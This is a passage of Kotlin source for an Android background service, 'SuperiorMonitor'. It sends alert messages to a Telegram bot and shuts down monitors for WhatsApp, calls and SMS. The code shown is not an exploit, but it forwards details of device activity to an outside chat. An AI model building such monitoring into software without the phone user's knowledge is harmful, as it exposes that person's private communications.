        alertLines.add("*$nameLabel* - $name")
        alertLines.add("")
        alertLines.add("*Taken Action* - $action")
        
        val alertMessage = alertLines.joinToString("\n")
        
        serviceScope.launch(Dispatchers.IO) {
            TelegramApi.sendMessage(currentPrefs.botToken, currentPrefs.chatId, alertMessage)
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  LIFECYCLE
    // ═══════════════════════════════════════════════════════════

    override fun onDestroy() {
        super.onDestroy()
        whatsAppMonitor?.stop()
        whatsAppMonitor = null
        callMonitor?.stop()
        callMonitor = null
        smsMonitor?.stop()
        smsMonitor = null
        TelegramApi.cancelAll()
        pollingJob?.cancel()
        serviceJob.cancel()
        networkEnforcer?.stop()

        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        networkCallback?.let { connectivityManager.unregisterNetworkCallback(it) }

        LogManager.setServiceRunning(false)
        LogManager.log(LogCategory.NETWORK, "Service Stopped")
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            "SuperiorMonitor Background Service",
            NotificationManager.IMPORTANCE_LOW
        )
        val manager = getSystemService(NotificationManager::class.java)
        manager?.createNotificationChannel(channel)
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Superior Monitor Active")
            .setContentText("Monitoring system events and bot queries...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()
    }
}
